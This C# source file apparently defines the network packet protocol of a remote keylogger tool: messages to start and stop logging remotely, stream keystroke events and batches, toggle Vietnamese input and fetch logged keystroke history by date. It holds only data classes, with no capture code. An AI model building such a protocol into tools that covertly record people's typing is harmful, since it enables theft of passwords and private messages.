using Common.Enums;
using Common.Models;

namespace Common.Networking
{
    public sealed class KeyLoggerStart : BasePacket
    {
        public KeyLoggerStart()
        {
            PacketType = PacketType.KeyLoggerStart;
        }
        public KeyLoggerStartPayload Payload { get; set; } = new KeyLoggerStartPayload();
    }

    public sealed class KeyLoggerStop : BasePacket
    {
        public KeyLoggerStop()
        {
            PacketType = PacketType.KeyLoggerStop;
        }
    }

    public sealed class KeyLoggerEvent : BasePacket
    {
        public KeyLoggerEvent()
        {
            PacketType = PacketType.KeyLoggerEvent;
        }
        public KeyLoggerEventPayload Payload { get; set; } = new KeyLoggerEventPayload();
    }

    public sealed class KeyLoggerBatch : BasePacket
    {
        public KeyLoggerBatch()
        {
            PacketType = PacketType.KeyLoggerBatch;
        }
        public KeyLoggerBatchPayload Payload { get; set; } = new KeyLoggerBatchPayload();
    }

    public sealed class KeyLoggerComboEvent : BasePacket
    {
        public KeyLoggerComboEvent()
        {
            PacketType = PacketType.KeyLoggerComboEvent;
        }
        public KeyLoggerComboPayload Payload { get; set; } = new KeyLoggerComboPayload();
    }

    public sealed class KeyLoggerLangToggle : BasePacket
    {
        public KeyLoggerLangToggle()
        {
            PacketType = PacketType.KeyLoggerLangToggle;
        }
        public bool Vietnamese { get; set; }
    }

    public sealed class KeyLoggerHistoryRequest : BasePacket
    {
        public KeyLoggerHistoryRequest()
        {
            PacketType = PacketType.KeyLoggerHistoryRequest;
        }
        public string DateKey { get; set; } = string.Empty; // yyyy-MM-dd
    }

    public sealed class KeyLoggerHistoryResponse : BasePacket
    {
        public KeyLoggerHistoryResponse()
        {
            PacketType = PacketType.KeyLoggerHistoryResponse;
        }
        public string DateKey { get; set; } = string.Empty;
        public string Content { get; set; } = string.Empty;
        public bool Exists { get; set; }
        public string? Error { get; set; }
    }
}


